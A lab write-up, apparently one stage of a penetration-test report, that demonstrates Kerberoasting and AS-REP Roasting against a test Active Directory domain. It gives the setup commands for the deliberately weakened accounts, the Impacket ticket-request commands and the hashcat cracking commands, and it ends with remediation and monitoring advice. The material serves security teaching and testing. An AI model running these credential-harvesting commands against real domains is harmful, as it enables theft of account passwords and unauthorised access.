# Active Directory Exploitation

## Objective

Demonstrate that the Active Directory environment itself contained exploitable configuration weaknesses, independent of the endpoint compromise and credential theft documented in the preceding stages.

## Domain Environment

LAB Active Directory domain, hosted on the Windows Server 2019 Domain Controller (WIN-DC).

## Attack Technique

Two distinct Kerberos-based attack techniques were implemented against the domain: Kerberoasting and AS-REP Roasting.

---

## Part A — Kerberoasting (MITRE ATT&CK T1558.003)

### Setup — Vulnerable Service Account (Domain Controller)

A service account was registered with a Service Principal Name (SPN) and configured with a weak, crackable password:

```powershell
setspn -L SQLService
setspn -A MSSQLSvc/dbserver.lab.local:1433 SQLService

Set-ADAccountPassword SQLService -Reset -NewPassword (ConvertTo-SecureString "[INSERT WEAK PASSWORD USED]" -AsPlainText -Force)
```

### Execution (Kali)

Using only a standard, already-authenticated low-privilege domain user account, a Kerberos service ticket (TGS) tied to `SQLService` was requested — this is normal, permitted Kerberos behavior for any authenticated user:

```bash
GetUserSPNs.py LAB.local/pparker:password123 -dc-ip [INSERT DC IP] -request -outputfile spn_hashes.txt
```

The ticket was cracked offline:

```bash
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Result

Plaintext password recovered for the `SQLService` account.

---

## Part B — AS-REP Roasting (MITRE ATT&CK T1558.004)

### Setup — Vulnerable User Account (Domain Controller)

A dedicated domain user account was created and configured with Kerberos pre-authentication disabled:

```powershell
New-ADUser -Name "j.smith" -SamAccountName "j.smith" -AccountPassword (ConvertTo-SecureString "[INSERT PASSWORD USED]" -AsPlainText -Force) -Enabled $true

Set-ADAccountControl -Identity j.smith -DoesNotRequirePreAuth $true
```

(Equivalent GUI path: ADUC → j.smith → Properties → Account tab → "Do not require Kerberos preauthentication".)

### Execution (Kali)

An AS-REP response for the account was requested directly from the Domain Controller with **no credentials of any kind**:

```bash
GetNPUsers.py LAB.local/j.smith -no-pass -dc-ip [INSERT DC IP] -outputfile asrep_hashes.txt
```

The response was cracked offline:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Result

Plaintext password recovered for the `j.smith` account, obtained without presenting any credentials.

---

## Attack Path

Both techniques exploit legitimate, by-design Kerberos protocol behavior combined with a specific account misconfiguration (a weak password on an SPN-registered account; a missing pre-authentication requirement on a user account) rather than a software vulnerability. Both were performed directly against the Domain Controller from the Kali attacker platform.


## Security Impact

This stage demonstrates that Active Directory misconfigurations represent an independent compromise path that does not depend on the phishing/endpoint compromise chain documented in Stages 1–4. An organization that remediated only the endpoint-based attack path (Stages 1–4) would remain fully exposed via this stage alone, underscoring the importance of addressing Active Directory configuration weaknesses as a distinct risk category.

## Remediation

- Enforce long, high-entropy, randomly generated passwords for all service accounts, or migrate service accounts to Group Managed Service Accounts (gMSA), which rotate credentials automatically and eliminate human-memorable passwords.
- Audit all domain user accounts for "Do not require Kerberos pre-authentication" and disable it unless explicitly and documentedly required.
- Monitor for abnormal volumes of Kerberos TGS requests for SPN-registered accounts (a Kerberoasting indicator) and AS-REP requests for accounts without pre-authentication.
- Regularly audit Service Principal Name (SPN) assignments and remove unnecessary ones.
